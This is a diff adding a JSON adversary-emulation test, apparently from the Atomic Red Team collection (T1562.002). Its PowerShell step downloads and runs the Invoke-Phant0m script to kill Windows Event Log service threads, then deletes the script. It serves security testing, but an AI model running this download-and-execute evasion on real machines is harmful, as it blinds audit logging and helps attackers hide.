@@ -1,0 +1,44 @@
+{
+  "id": "41ac52ba-5d5e-40c0-b267-573ed90489bd",
+  "name": "Kill Event Log Service Threads",
+  "description": "Kill Windows Event Log Service Threads using Invoke-Phant0m. WARNING you will need to restart PC to return to normal state with Log Service. https://artofpwn.com/phant0m-killing-windows-event-log.html",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "4e125741-fe94-4492-a9e7-9df07af37e10",
+      "type": "execute-command",
+      "data": {
+        "command": "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore\n$url = \"https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1\"\n$output = \"$env:TEMP\\Invoke-Phant0m.ps1\"\n$wc = New-Object System.Net.WebClient\n$wc.DownloadFile($url, $output)\ncd $env:TEMP\nImport-Module .\\Invoke-Phant0m.ps1\nInvoke-Phant0m\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "ebd2d77d-8fc6-48ca-af43-053a5d6fe840",
+      "type": "execute-command",
+      "data": {
+        "command": "Write-Host \"NEED TO Restart-Computer TO ENSURE LOGGING RETURNS\" -fore red\nRemove-Item \"$env:TEMP\\Invoke-Phant0m.ps1\" -ErrorAction Ignore\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "4e125741-fe94-4492-a9e7-9df07af37e10",
+      "p": "on-success",
+      "o": "ebd2d77d-8fc6-48ca-af43-053a5d6fe840"
+    },
+    {
+      "s": "4e125741-fe94-4492-a9e7-9df07af37e10",
+      "p": "on-failure",
+      "o": "ebd2d77d-8fc6-48ca-af43-053a5d6fe840"
+    }
+  ],
+  "tags": [
+    "T1562.002",
+    "atomic-red-team"
+  ]
+}
